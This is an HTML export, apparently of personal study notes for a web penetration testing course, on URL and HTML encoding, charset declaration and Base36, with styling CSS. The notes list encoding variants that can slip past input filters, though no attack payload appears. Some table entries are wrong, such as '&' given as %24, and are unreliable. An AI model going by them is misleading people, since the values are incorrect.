@@ -1,0 +1,785 @@
+<html><head><meta http-equiv="Content-Type" content="text/html; charset=utf-8"/><title>Encoding &amp; Filtering</title><style>
+/* cspell:disable-file */
+/* webkit printing magic: print all background colors */
+html {
+	-webkit-print-color-adjust: exact;
+}
+* {
+	box-sizing: border-box;
+	-webkit-print-color-adjust: exact;
+}
+
+html,
+body {
+	margin: 0;
+	padding: 0;
+}
+@media only screen {
+	body {
+		margin: 2em auto;
+		max-width: 900px;
+		color: rgb(55, 53, 47);
+	}
+}
+
+body {
+	line-height: 1.5;
+	white-space: pre-wrap;
+}
+
+a,
+a.visited {
+	color: inherit;
+	text-decoration: underline;
+}
+
+.pdf-relative-link-path {
+	font-size: 80%;
+	color: #444;
+}
+
+h1,
+h2,
+h3 {
+	letter-spacing: -0.01em;
+	line-height: 1.2;
+	font-weight: 600;
+	margin-bottom: 0;
+}
+
+.page-title {
+	font-size: 2.5rem;
+	font-weight: 700;
+	margin-top: 0;
+	margin-bottom: 0.75em;
+}
+
+h1 {
+	font-size: 1.875rem;
+	margin-top: 1.875rem;
+}
+
+h2 {
+	font-size: 1.5rem;
+	margin-top: 1.5rem;
+}
+
+h3 {
+	font-size: 1.25rem;
+	margin-top: 1.25rem;
+}
+
+.source {
+	border: 1px solid #ddd;
+	border-radius: 3px;
+	padding: 1.5em;
+	word-break: break-all;
+}
+
+.callout {
+	border-radius: 3px;
+	padding: 1rem;
+}
+
+figure {
+	margin: 1.25em 0;
+	page-break-inside: avoid;
+}
+
+figcaption {
+	opacity: 0.5;
+	font-size: 85%;
+	margin-top: 0.5em;
+}
+
+mark {
+	background-color: transparent;
+}
+
+.indented {
+	padding-left: 1.5em;
+}
+
+hr {
+	background: transparent;
+	display: block;
+	width: 100%;
+	height: 1px;
+	visibility: visible;
+	border: none;
+	border-bottom: 1px solid rgba(55, 53, 47, 0.09);
+}
+
+img {
+	max-width: 100%;
+}
+
+@media only print {
+	img {
+		max-height: 100vh;
+		object-fit: contain;
+	}
+}
+
+@page {
+	margin: 1in;
+}
+
+.collection-content {
+	font-size: 0.875rem;
+}
+
+.column-list {
+	display: flex;
+	justify-content: space-between;
+}
+
+.column {
+	padding: 0 1em;
+}
+
+.column:first-child {
+	padding-left: 0;
+}
+
+.column:last-child {
+	padding-right: 0;
+}
+
+.table_of_contents-item {
+	display: block;
+	font-size: 0.875rem;
+	line-height: 1.3;
+	padding: 0.125rem;
+}
+
+.table_of_contents-indent-1 {
+	margin-left: 1.5rem;
+}
+
+.table_of_contents-indent-2 {
+	margin-left: 3rem;
+}
+
+.table_of_contents-indent-3 {
+	margin-left: 4.5rem;
+}
+
+.table_of_contents-link {
+	text-decoration: none;
+	opacity: 0.7;
+	border-bottom: 1px solid rgba(55, 53, 47, 0.18);
+}
+
+table,
+th,
+td {
+	border: 1px solid rgba(55, 53, 47, 0.09);
+	border-collapse: collapse;
+}
+
+table {
+	border-left: none;
+	border-right: none;
+}
+
+th,
+td {
+	font-weight: normal;
+	padding: 0.25em 0.5em;
+	line-height: 1.5;
+	min-height: 1.5em;
+	text-align: left;
+}
+
+th {
+	color: rgba(55, 53, 47, 0.6);
+}
+
+ol,
+ul {
+	margin: 0;
+	margin-block-start: 0.6em;
+	margin-block-end: 0.6em;
+}
+
+li > ol:first-child,
+li > ul:first-child {
+	margin-block-start: 0.6em;
+}
+
+ul > li {
+	list-style: disc;
+}
+
+ul.to-do-list {
+	padding-inline-start: 0;
+}
+
+ul.to-do-list > li {
+	list-style: none;
+}
+
+.to-do-children-checked {
+	text-decoration: line-through;
+	opacity: 0.375;
+}
+
+ul.toggle > li {
+	list-style: none;
+}
+
+ul {
+	padding-inline-start: 1.7em;
+}
+
+ul > li {
+	padding-left: 0.1em;
+}
+
+ol {
+	padding-inline-start: 1.6em;
+}
+
+ol > li {
+	padding-left: 0.2em;
+}
+
+.mono ol {
+	padding-inline-start: 2em;
+}
+
+.mono ol > li {
+	text-indent: -0.4em;
+}
+
+.toggle {
+	padding-inline-start: 0em;
+	list-style-type: none;
+}
+
+/* Indent toggle children */
+.toggle > li > details {
+	padding-left: 1.7em;
+}
+
+.toggle > li > details > summary {
+	margin-left: -1.1em;
+}
+
+.selected-value {
+	display: inline-block;
+	padding: 0 0.5em;
+	background: rgba(206, 205, 202, 0.5);
+	border-radius: 3px;
+	margin-right: 0.5em;
+	margin-top: 0.3em;
+	margin-bottom: 0.3em;
+	white-space: nowrap;
+}
+
+.collection-title {
+	display: inline-block;
+	margin-right: 1em;
+}
+
+.page-description {
+    margin-bottom: 2em;
+}
+
+.simple-table {
+	margin-top: 1em;
+	font-size: 0.875rem;
+	empty-cells: show;
+}
+.simple-table td {
+	height: 29px;
+	min-width: 120px;
+}
+
+.simple-table th {
+	height: 29px;
+	min-width: 120px;
+}
+
+.simple-table-header-color {
+	background: rgb(247, 246, 243);
+	color: black;
+}
+.simple-table-header {
+	font-weight: 500;
+}
+
+time {
+	opacity: 0.5;
+}
+
+.icon {
+	display: inline-block;
+	max-width: 1.2em;
+	max-height: 1.2em;
+	text-decoration: none;
+	vertical-align: text-bottom;
+	margin-right: 0.5em;
+}
+
+img.icon {
+	border-radius: 3px;
+}
+
+.user-icon {
+	width: 1.5em;
+	height: 1.5em;
+	border-radius: 100%;
+	margin-right: 0.5rem;
+}
+
+.user-icon-inner {
+	font-size: 0.8em;
+}
+
+.text-icon {
+	border: 1px solid #000;
+	text-align: center;
+}
+
+.page-cover-image {
+	display: block;
+	object-fit: cover;
+	width: 100%;
+	max-height: 30vh;
+}
+
+.page-header-icon {
+	font-size: 3rem;
+	margin-bottom: 1rem;
+}
+
+.page-header-icon-with-cover {
+	margin-top: -0.72em;
+	margin-left: 0.07em;
+}
+
+.page-header-icon img {
+	border-radius: 3px;
+}
+
+.link-to-page {
+	margin: 1em 0;
+	padding: 0;
+	border: none;
+	font-weight: 500;
+}
+
+p > .user {
+	opacity: 0.5;
+}
+
+td > .user,
+td > time {
+	white-space: nowrap;
+}
+
+input[type="checkbox"] {
+	transform: scale(1.5);
+	margin-right: 0.6em;
+	vertical-align: middle;
+}
+
+p {
+	margin-top: 0.5em;
+	margin-bottom: 0.5em;
+}
+
+.image {
+	border: none;
+	margin: 1.5em 0;
+	padding: 0;
+	border-radius: 0;
+	text-align: center;
+}
+
+.code,
+code {
+	background: rgba(135, 131, 120, 0.15);
+	border-radius: 3px;
+	padding: 0.2em 0.4em;
+	border-radius: 3px;
+	font-size: 85%;
+	tab-size: 2;
+}
+
+code {
+	color: #eb5757;
+}
+
+.code {
+	padding: 1.5em 1em;
+}
+
+.code-wrap {
+	white-space: pre-wrap;
+	word-break: break-all;
+}
+
+.code > code {
+	background: none;
+	padding: 0;
+	font-size: 100%;
+	color: inherit;
+}
+
+blockquote {
+	font-size: 1.25em;
+	margin: 1em 0;
+	padding-left: 1em;
+	border-left: 3px solid rgb(55, 53, 47);
+}
+
+.bookmark {
+	text-decoration: none;
+	max-height: 8em;
+	padding: 0;
+	display: flex;
+	width: 100%;
+	align-items: stretch;
+}
+
+.bookmark-title {
+	font-size: 0.85em;
+	overflow: hidden;
+	text-overflow: ellipsis;
+	height: 1.75em;
+	white-space: nowrap;
+}
+
+.bookmark-text {
+	display: flex;
+	flex-direction: column;
+}
+
+.bookmark-info {
+	flex: 4 1 180px;
+	padding: 12px 14px 14px;
+	display: flex;
+	flex-direction: column;
+	justify-content: space-between;
+}
+
+.bookmark-image {
+	width: 33%;
+	flex: 1 1 180px;
+	display: block;
+	position: relative;
+	object-fit: cover;
+	border-radius: 1px;
+}
+
+.bookmark-description {
+	color: rgba(55, 53, 47, 0.6);
+	font-size: 0.75em;
+	overflow: hidden;
+	max-height: 4.5em;
+	word-break: break-word;
+}
+
+.bookmark-href {
+	font-size: 0.75em;
+	margin-top: 0.25em;
+}
+
+.sans { font-family: ui-sans-serif, -apple-system, BlinkMacSystemFont, "Segoe UI Variable Display", "Segoe UI", Helvetica, "Apple Color Emoji", Arial, sans-serif, "Segoe UI Emoji", "Segoe UI Symbol"; }
+.code { font-family: "SFMono-Regular", Menlo, Consolas, "PT Mono", "Liberation Mono", Courier, monospace; }
+.serif { font-family: Lyon-Text, Georgia, ui-serif, serif; }
+.mono { font-family: iawriter-mono, Nitti, Menlo, Courier, monospace; }
+.pdf .sans { font-family: Inter, ui-sans-serif, -apple-system, BlinkMacSystemFont, "Segoe UI Variable Display", "Segoe UI", Helvetica, "Apple Color Emoji", Arial, sans-serif, "Segoe UI Emoji", "Segoe UI Symbol", 'Twemoji', 'Noto Color Emoji', 'Noto Sans CJK JP'; }
+.pdf:lang(zh-CN) .sans { font-family: Inter, ui-sans-serif, -apple-system, BlinkMacSystemFont, "Segoe UI Variable Display", "Segoe UI", Helvetica, "Apple Color Emoji", Arial, sans-serif, "Segoe UI Emoji", "Segoe UI Symbol", 'Twemoji', 'Noto Color Emoji', 'Noto Sans CJK SC'; }
+.pdf:lang(zh-TW) .sans { font-family: Inter, ui-sans-serif, -apple-system, BlinkMacSystemFont, "Segoe UI Variable Display", "Segoe UI", Helvetica, "Apple Color Emoji", Arial, sans-serif, "Segoe UI Emoji", "Segoe UI Symbol", 'Twemoji', 'Noto Color Emoji', 'Noto Sans CJK TC'; }
+.pdf:lang(ko-KR) .sans { font-family: Inter, ui-sans-serif, -apple-system, BlinkMacSystemFont, "Segoe UI Variable Display", "Segoe UI", Helvetica, "Apple Color Emoji", Arial, sans-serif, "Segoe UI Emoji", "Segoe UI Symbol", 'Twemoji', 'Noto Color Emoji', 'Noto Sans CJK KR'; }
+.pdf .code { font-family: Source Code Pro, "SFMono-Regular", Menlo, Consolas, "PT Mono", "Liberation Mono", Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK JP'; }
+.pdf:lang(zh-CN) .code { font-family: Source Code Pro, "SFMono-Regular", Menlo, Consolas, "PT Mono", "Liberation Mono", Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK SC'; }
+.pdf:lang(zh-TW) .code { font-family: Source Code Pro, "SFMono-Regular", Menlo, Consolas, "PT Mono", "Liberation Mono", Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK TC'; }
+.pdf:lang(ko-KR) .code { font-family: Source Code Pro, "SFMono-Regular", Menlo, Consolas, "PT Mono", "Liberation Mono", Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK KR'; }
+.pdf .serif { font-family: PT Serif, Lyon-Text, Georgia, ui-serif, serif, 'Twemoji', 'Noto Color Emoji', 'Noto Serif CJK JP'; }
+.pdf:lang(zh-CN) .serif { font-family: PT Serif, Lyon-Text, Georgia, ui-serif, serif, 'Twemoji', 'Noto Color Emoji', 'Noto Serif CJK SC'; }
+.pdf:lang(zh-TW) .serif { font-family: PT Serif, Lyon-Text, Georgia, ui-serif, serif, 'Twemoji', 'Noto Color Emoji', 'Noto Serif CJK TC'; }
+.pdf:lang(ko-KR) .serif { font-family: PT Serif, Lyon-Text, Georgia, ui-serif, serif, 'Twemoji', 'Noto Color Emoji', 'Noto Serif CJK KR'; }
+.pdf .mono { font-family: PT Mono, iawriter-mono, Nitti, Menlo, Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK JP'; }
+.pdf:lang(zh-CN) .mono { font-family: PT Mono, iawriter-mono, Nitti, Menlo, Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK SC'; }
+.pdf:lang(zh-TW) .mono { font-family: PT Mono, iawriter-mono, Nitti, Menlo, Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK TC'; }
+.pdf:lang(ko-KR) .mono { font-family: PT Mono, iawriter-mono, Nitti, Menlo, Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK KR'; }
+.highlight-default {
+	color: rgba(55, 53, 47, 1);
+}
+.highlight-gray {
+	color: rgba(120, 119, 116, 1);
+	fill: rgba(120, 119, 116, 1);
+}
+.highlight-brown {
+	color: rgba(159, 107, 83, 1);
+	fill: rgba(159, 107, 83, 1);
+}
+.highlight-orange {
+	color: rgba(217, 115, 13, 1);
+	fill: rgba(217, 115, 13, 1);
+}
+.highlight-yellow {
+	color: rgba(203, 145, 47, 1);
+	fill: rgba(203, 145, 47, 1);
+}
+.highlight-teal {
+	color: rgba(68, 131, 97, 1);
+	fill: rgba(68, 131, 97, 1);
+}
+.highlight-blue {
+	color: rgba(51, 126, 169, 1);
+	fill: rgba(51, 126, 169, 1);
+}
+.highlight-purple {
+	color: rgba(144, 101, 176, 1);
+	fill: rgba(144, 101, 176, 1);
+}
+.highlight-pink {
+	color: rgba(193, 76, 138, 1);
+	fill: rgba(193, 76, 138, 1);
+}
+.highlight-red {
+	color: rgba(212, 76, 71, 1);
+	fill: rgba(212, 76, 71, 1);
+}
+.highlight-gray_background {
+	background: rgba(241, 241, 239, 1);
+}
+.highlight-brown_background {
+	background: rgba(244, 238, 238, 1);
+}
+.highlight-orange_background {
+	background: rgba(251, 236, 221, 1);
+}
+.highlight-yellow_background {
+	background: rgba(251, 243, 219, 1);
+}
+.highlight-teal_background {
+	background: rgba(237, 243, 236, 1);
+}
+.highlight-blue_background {
+	background: rgba(231, 243, 248, 1);
+}
+.highlight-purple_background {
+	background: rgba(244, 240, 247, 0.8);
+}
+.highlight-pink_background {
+	background: rgba(249, 238, 243, 0.8);
+}
+.highlight-red_background {
+	background: rgba(253, 235, 236, 1);
+}
+.block-color-default {
+	color: inherit;
+	fill: inherit;
+}
+.block-color-gray {
+	color: rgba(120, 119, 116, 1);
+	fill: rgba(120, 119, 116, 1);
+}
+.block-color-brown {
+	color: rgba(159, 107, 83, 1);
+	fill: rgba(159, 107, 83, 1);
+}
+.block-color-orange {
+	color: rgba(217, 115, 13, 1);
+	fill: rgba(217, 115, 13, 1);
+}
+.block-color-yellow {
+	color: rgba(203, 145, 47, 1);
+	fill: rgba(203, 145, 47, 1);
+}
+.block-color-teal {
+	color: rgba(68, 131, 97, 1);
+	fill: rgba(68, 131, 97, 1);
+}
+.block-color-blue {
+	color: rgba(51, 126, 169, 1);
+	fill: rgba(51, 126, 169, 1);
+}
+.block-color-purple {
+	color: rgba(144, 101, 176, 1);
+	fill: rgba(144, 101, 176, 1);
+}
+.block-color-pink {
+	color: rgba(193, 76, 138, 1);
+	fill: rgba(193, 76, 138, 1);
+}
+.block-color-red {
+	color: rgba(212, 76, 71, 1);
+	fill: rgba(212, 76, 71, 1);
+}
+.block-color-gray_background {
+	background: rgba(241, 241, 239, 1);
+}
+.block-color-brown_background {
+	background: rgba(244, 238, 238, 1);
+}
+.block-color-orange_background {
+	background: rgba(251, 236, 221, 1);
+}
+.block-color-yellow_background {
+	background: rgba(251, 243, 219, 1);
+}
+.block-color-teal_background {
+	background: rgba(237, 243, 236, 1);
+}
+.block-color-blue_background {
+	background: rgba(231, 243, 248, 1);
+}
+.block-color-purple_background {
+	background: rgba(244, 240, 247, 0.8);
+}
+.block-color-pink_background {
+	background: rgba(249, 238, 243, 0.8);
+}
+.block-color-red_background {
+	background: rgba(253, 235, 236, 1);
+}
+.select-value-color-uiBlue { background-color: rgba(35, 131, 226, .07); }
+.select-value-color-pink { background-color: rgba(245, 224, 233, 1); }
+.select-value-color-purple { background-color: rgba(232, 222, 238, 1); }
+.select-value-color-green { background-color: rgba(219, 237, 219, 1); }
+.select-value-color-gray { background-color: rgba(227, 226, 224, 1); }
+.select-value-color-transparentGray { background-color: rgba(227, 226, 224, 0); }
+.select-value-color-translucentGray { background-color: rgba(0, 0, 0, 0.06); }
+.select-value-color-orange { background-color: rgba(250, 222, 201, 1); }
+.select-value-color-brown { background-color: rgba(238, 224, 218, 1); }
+.select-value-color-red { background-color: rgba(255, 226, 221, 1); }
+.select-value-color-yellow { background-color: rgba(253, 236, 200, 1); }
+.select-value-color-blue { background-color: rgba(211, 229, 239, 1); }
+.select-value-color-pageGlass { background-color: undefined; }
+.select-value-color-washGlass { background-color: undefined; }
+
+.checkbox {
+	display: inline-flex;
+	vertical-align: text-bottom;
+	width: 16;
+	height: 16;
+	background-size: 16px;
+	margin-left: 2px;
+	margin-right: 5px;
+}
+
+.checkbox-on {
+	background-image: url("data:image/svg+xml;charset=UTF-8,%3Csvg%20width%3D%2216%22%20height%3D%2216%22%20viewBox%3D%220%200%2016%2016%22%20fill%3D%22none%22%20xmlns%3D%22http%3A%2F%2Fwww.w3.org%2F2000%2Fsvg%22%3E%0A%3Crect%20width%3D%2216%22%20height%3D%2216%22%20fill%3D%22%2358A9D7%22%2F%3E%0A%3Cpath%20d%3D%22M6.71429%2012.2852L14%204.9995L12.7143%203.71436L6.71429%209.71378L3.28571%206.2831L2%207.57092L6.71429%2012.2852Z%22%20fill%3D%22white%22%2F%3E%0A%3C%2Fsvg%3E");
+}
+
+.checkbox-off {
+	background-image: url("data:image/svg+xml;charset=UTF-8,%3Csvg%20width%3D%2216%22%20height%3D%2216%22%20viewBox%3D%220%200%2016%2016%22%20fill%3D%22none%22%20xmlns%3D%22http%3A%2F%2Fwww.w3.org%2F2000%2Fsvg%22%3E%0A%3Crect%20x%3D%220.75%22%20y%3D%220.75%22%20width%3D%2214.5%22%20height%3D%2214.5%22%20fill%3D%22white%22%20stroke%3D%22%2336352F%22%20stroke-width%3D%221.5%22%2F%3E%0A%3C%2Fsvg%3E");
+}
+	
+</style></head><body><article id="f154874c-2929-4bdd-9c53-27b0b86b59be" class="page mono"><header><h1 class="page-title"><strong>Encoding &amp; Filtering</strong></h1><p class="page-description"></p><table class="properties"><tbody><tr class="property-row property-row-multi_select"><th><span class="icon property-icon"><svg role="graphics-symbol" viewBox="0 0 16 16" style="width:14px;height:14px;display:block;fill:rgba(55, 53, 47, 0.45);flex-shrink:0" class="typesMultipleSelect"><path d="M1.91602 4.83789C2.44238 4.83789 2.87305 4.40723 2.87305 3.87402C2.87305 3.34766 2.44238 2.91699 1.91602 2.91699C1.38281 2.91699 0.952148 3.34766 0.952148 3.87402C0.952148 4.40723 1.38281 4.83789 1.91602 4.83789ZM5.1084 4.52344H14.3984C14.7607 4.52344 15.0479 4.23633 15.0479 3.87402C15.0479 3.51172 14.7607 3.22461 14.3984 3.22461H5.1084C4.74609 3.22461 4.45898 3.51172 4.45898 3.87402C4.45898 4.23633 4.74609 4.52344 5.1084 4.52344ZM1.91602 9.03516C2.44238 9.03516 2.87305 8.60449 2.87305 8.07129C2.87305 7.54492 2.44238 7.11426 1.91602 7.11426C1.38281 7.11426 0.952148 7.54492 0.952148 8.07129C0.952148 8.60449 1.38281 9.03516 1.91602 9.03516ZM5.1084 8.7207H14.3984C14.7607 8.7207 15.0479 8.43359 15.0479 8.07129C15.0479 7.70898 14.7607 7.42188 14.3984 7.42188H5.1084C4.74609 7.42188 4.45898 7.70898 4.45898 8.07129C4.45898 8.43359 4.74609 8.7207 5.1084 8.7207ZM1.91602 13.2324C2.44238 13.2324 2.87305 12.8018 2.87305 12.2686C2.87305 11.7422 2.44238 11.3115 1.91602 11.3115C1.38281 11.3115 0.952148 11.7422 0.952148 12.2686C0.952148 12.8018 1.38281 13.2324 1.91602 13.2324ZM5.1084 12.918H14.3984C14.7607 12.918 15.0479 12.6309 15.0479 12.2686C15.0479 11.9062 14.7607 11.6191 14.3984 11.6191H5.1084C4.74609 11.6191 4.45898 11.9062 4.45898 12.2686C4.45898 12.6309 4.74609 12.918 5.1084 12.918Z"></path></svg></span>Tags</th><td><span class="selected-value select-value-color-red">eWPTX v2 INE</span></td></tr></tbody></table></header><div class="page-body"><h2 id="ec46e718-8767-4651-9e07-4e6b018d14a9" class=""><strong>Data Encoding Basics</strong></h2><h3 id="174f2e56-68d6-4210-9b12-c9292f813d48" class=""><strong>URL encoding</strong></h3><p id="00c00f58-743c-4b74-b134-f907b706d5df" class="">This table is a character encoding chart that is useful in explaining which characters are “safe” and which characters should be encoded in URLs.</p><ul id="88e6ebd7-84a6-4ee9-8829-b3fd54ff0c6b" class="bulleted-list"><li style="list-style-type:disc">http://perishablepress.com/stop-using-unsafe-characters-in-urls/</li></ul><p id="f848c589-1289-434d-9971-8f056fa3aba6" class="">Some commonly encoded characters are:</p><table id="933e5ed4-c133-4418-8360-b139bc8ff011" class="simple-table"><tbody><tr id="7adfc219-aff4-4649-831b-26e0f6b6d91a"><td id="]\zK" class="">Character</td><td id="m&lt;kP" class="">Purporse in URL</td><td id="Sb``" class="">Encoding</td></tr><tr id="3d739af9-b872-4e7c-b9fb-5985fd6e4440"><td id="]\zK" class="">’#’</td><td id="m&lt;kP" class="">Separate anchors</td><td id="Sb``" class="">%23</td></tr><tr id="0c3d0c68-76b6-4de3-adb5-09ea6e3b6131"><td id="]\zK" class="">’?’</td><td id="m&lt;kP" class="">Separate query string</td><td id="Sb``" class="">%3F</td></tr><tr id="298a9e31-3547-4e92-b062-dd6236823a46"><td id="]\zK" class="">‘&amp;’</td><td id="m&lt;kP" class="">Separate query elements</td><td id="Sb``" class="">%24</td></tr><tr id="95432373-0a3c-4e4c-a35b-a96079983b22"><td id="]\zK" class="">’%’</td><td id="m&lt;kP" class="">Indicates an encoded character</td><td id="Sb``" class="">%25</td></tr><tr id="23d5ce28-b9d2-47b7-b8df-e3598e39be8f"><td id="]\zK" class="">’/’</td><td id="m&lt;kP" class="">Separate domain and directories</td><td id="Sb``" class="">%2F</td></tr><tr id="5ba61b6d-785f-43cf-9461-f9399a95f05b"><td id="]\zK" class="">’+’</td><td id="m&lt;kP" class="">Indicates a space</td><td id="Sb``" class="">%2B</td></tr><tr id="aa5be7a2-c39e-471d-b770-400fc1ed1137"><td id="]\zK" class="">‘&#x27;</td><td id="m&lt;kP" class="">Not recommended</td><td id="Sb``" class="">%20 or +</td></tr></tbody></table><h3 id="d7dac10a-c864-4adb-b010-98c12d616df9" class=""><strong>HTML encoding</strong></h3><p id="ded32d44-17c8-4812-901c-05e879984024" class="">Documents transmitted via HTTP can send a charset parameter in the header to specify the character encoding of the document sent. This is the HTTP header: <strong>Content-Type</strong></p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="8f931aff-a79c-49fa-ad83-e3eb68f131aa" class="code"><code class="language-Plain Text" style="white-space:pre-wrap;word-break:break-all">Content-Type:text/html;charset=utf-8
+</code></pre><p id="7f3ac9cd-aa30-4299-8f33-2c876ed680ba" class="">Define character encoding using HTTP</p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="699c03ec-068f-493b-af83-b7ac244dc74d" class="code"><code class="language-Plain Text" style="white-space:pre-wrap;word-break:break-all"># PHP &gt; Uses the header() function to send a raw HTTP header:
+header(&#x27;Content-Type:text/html;charset=utf-8&#x27;)
+
+# ASP.Net &gt; Uses the response object:
+&lt;%Response.charset=&quot;utf-8&quot;%&gt;
+
+# JSP &gt; Uses the page directive:
+&lt;%@ page contentType=&quot;text/html; charset=UTF-8&quot;%&gt;
+</code></pre><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="934b4bd0-046f-4e35-8bf3-ff54848eba91" class="code"><code class="language-Plain Text" style="white-space:pre-wrap;word-break:break-all"># Using directive META:
+&lt;meta http-equiv=&quot;Content-Type&quot; Content=&quot;text/html;charset=utf-8&quot;&gt;
+
+# With HTML5, is also possible to write:
+&lt;meta charset=&quot;utf-8&quot;&gt;
+</code></pre><h3 id="bdbac75b-b0b6-4396-93a9-fba3abef092b" class=""><strong>HTML4 and HTML5 specifications about special characters</strong></h3><p id="a0cf97f8-8aa9-49db-991b-018ea2e55db3" class="">http://www.w3.org/TR/1998/REC-html40-19980424/charset.html#h-5.3</p><p id="44e0b2c7-cf9d-432c-9759-d563b0d1c3c8" class="">http://www.w3.org/TR/html5/single-page.html#character-references</p><ul id="20578555-38a7-4629-ba6a-3e2c730e8bf6" class="bulleted-list"><li style="list-style-type:disc">Named characters references:</li></ul><p id="09b62aab-39aa-482f-a284-d633ca7fa83c" class="">→ http://en.wikipedia.org/wiki/List_of_XML_and_HTML_character_entity_references#Character_entity_references_in_HTML</p><p id="e6d03e98-e5bf-49d9-8e22-17c66a4d43bd" class="">Characters references must start with a <strong>U+0026</strong> AMPERSAND character <strong>(&amp;)</strong>:</p><table id="6a3da943-bb5b-43dc-87bd-2a1fd928a371" class="simple-table"><tbody><tr id="47bc0f38-eb32-41c7-a471-cdde6670efc3"><td id="DcxQ" class="">CHaracter Reference</td><td id="A@g:" class="">Rule</td><td id="Abav" class="">Encoded character</td></tr><tr id="3014a592-a18a-4b07-8bbf-af9ea2f2a915"><td id="DcxQ" class="">Named entity</td><td id="A@g:" class="">&amp; + named character references + ;</td><td id="Abav" class="">&amp;It;</td></tr><tr id="bbb09ac3-f4d8-4061-810d-5006c3d43b83"><td id="DcxQ" class="">Numeric Decimal</td><td id="A@g:" class="">&amp; + # + + ;</td><td id="Abav" class="">&lt;</td></tr><tr id="e8e70906-6e27-4b33-a7f8-ede250808d38"><td id="DcxQ" class="">Numeric Hexadecimal</td><td id="A@g:" class="">&amp; + #x + + ;</td><td id="Abav" class="">&lt; / &amp;#X3C;</td></tr></tbody></table><p id="cc329dfe-c3d9-43a8-b1d1-179d4d729ebb" class="">Some Variations:</p><table id="878d811a-e030-4a53-91b4-67f987a6fd65" class="simple-table"><tbody><tr id="1ff77439-ca93-41c7-bb76-eb52d4a119d3"><td id="Xd;K" class="">CHaracter Reference</td><td id="@&lt;\E" class="">Variation</td><td id="H?X`" class="">Encoded character</td></tr><tr id="fdf622db-45d9-4516-9202-47a86dd73ad8"><td id="Xd;K" class="">Numeric Decimal</td><td id="@&lt;\E" class="">No terminator (;)</td><td id="H?X`" class="">&lt;</td></tr><tr id="873db923-e9bd-47f2-a21a-a23b487a90d2"><td id="Xd;K" class=""></td><td id="@&lt;\E" class="">One or more zeroes before code</td><td id="H?X`" class="">&amp;#060 / &amp;#0000060</td></tr><tr id="c0947a2b-60e4-4781-b632-d8c08a895f73"><td id="Xd;K" class="">Numeric Hexadecimal</td><td id="@&lt;\E" class="">No terminator (;)</td><td id="H?X`" class="">&amp;#x3c</td></tr><tr id="ae0fee80-6dd0-4d8c-869c-a5fe9d8e856c"><td id="Xd;K" class=""></td><td id="@&lt;\E" class="">One or more zeroes before code</td><td id="H?X`" class="">&amp;#0x3c / &amp;#00003c</td></tr></tbody></table><h3 id="5448d31b-abae-4ad7-bb3c-69dff39662fe" class=""><strong>Base (36|64) encoding</strong></h3><h3 id="d903268e-86bb-4bca-af82-ce235556b06e" class=""><strong>Base 36 Encoding Scheme</strong></h3><p id="d79362f7-357c-41ad-9c86-3e2e99176409" class="">Base36 - Its the most compact, case-insensitive, alphanumerical system using ASCII characters. In fact, the schemes alphabet contains all digits [0-9] and Latin letters [A-Z]</p><figure id="ed0113ed-7b7a-4eac-b696-d2506b832610" class="image"><a href="https://johnermac.github.io/assets/images/posts/ewptx/34.png"><img src="https://johnermac.github.io/assets/images/posts/ewptx/34.png"/></a></figure><p id="df1a2c15-9ba5-447d-b583-30ae9f437849" class="">Its used in many real-world scenarios</p><ul id="7385c694-8f9a-4ae3-bfaa-683268c0c71e" class="bulleted-list"><li style="list-style-type:disc">Reddit used if For identifying both posts and comments</li></ul><p id="6fd5fb54-8400-4c58-8b28-db63698d76bd" class="">Some URL shortening services like TinyURL use Base36 integer as compact, alphanumeric identifiers.</p><p id="cd4b5671-135e-4791-b519-724f8b31f948" class="">→ http://tinyurl/ljasd</p><p id="d0b7345c-7849-4def-b85d-aff5dffbb41a" class=""><strong>PHP</strong></p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" 